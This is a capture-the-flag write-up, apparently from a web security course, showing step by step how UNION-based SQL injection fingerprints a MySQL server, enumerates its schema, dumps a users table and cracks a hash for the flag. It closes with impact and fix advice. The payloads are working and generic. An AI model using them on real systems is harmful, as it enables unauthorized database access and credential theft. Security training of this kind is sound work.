# Get the flag
Page: `/?page=member`

Put some number on it and discover that is may use a DB call (select) to retrieve informations.
So first of all we need to fingerprint the database server (if it's mySQL, oracle...)
Usually adding a single quote ' or a semicolon ; is enough to get an error if the query isn't filtered.
And here it comes : *MySQL*

Once we know that we need to fingerprint the version of the server (to know possible known attacks, or features we can use).

Example of features for mySQL: 
```
From Version 4.0: UNION
From Version 4.1: Subqueries
From Version 5.0: Stored procedures, Stored functions and the view named INFORMATION_SCHEMA
From Version 5.0.2: Triggers
```
[_source_](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.html)

`1 AND 1=0 UNION SELECT 1, @@version `
=> *5.5.44-0ubuntu0.12.04.1*
(if we try just UNION SELECT @@ version we got the union error of number columns, that's why we add a fake select field '1', as @@version only return one column)

MySQL >= 5.0 as a very helpfull feature which is *INFORMATION_SCHEMA*
>Provides access to database metadata, information about the MySQL server such as the name of a database or table [...]
See [_here_](https://dev.mysql.com/doc/refman/5.6/en/information-schema.html)

1. Retrieve databases
`1 AND 1=0 UNION SELECT 1, DATABASE()`
=> *Member_Sql_Injection*

2. Retrieve tables
`1 AND 1=0 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE()`
=> *users*

3. Retrieve columns 
`1 AND 1=0 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE()`
=> *user_id, first_name, last_name, town, country, planet, Commentaire, countersign*

_N.B: good practice to add table name if the union permit it and if there is multiple tables (here it's just for example purpose)_

4. Getting all informations about a user
`1 AND 1=0 UNION SELECT 1, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users`
=> *Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28*

So if we decrypt it with https://hashtoolkit.com/ we get : FortyTwo. Then
we need to hash fortytwo with sha256.

# Security issue
>A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system
[_source_](https://owasp.org/www-community/attacks/SQL_Injection)

# Fix it
1. Don't show error message on production !
2. Use parameterized statements to specify what you're going to receive (you can add regexp, typechecking etc...)
3. Use an ORM (they usually use parameterized statements)
4. Keep your database server up-to-date (as your ORM)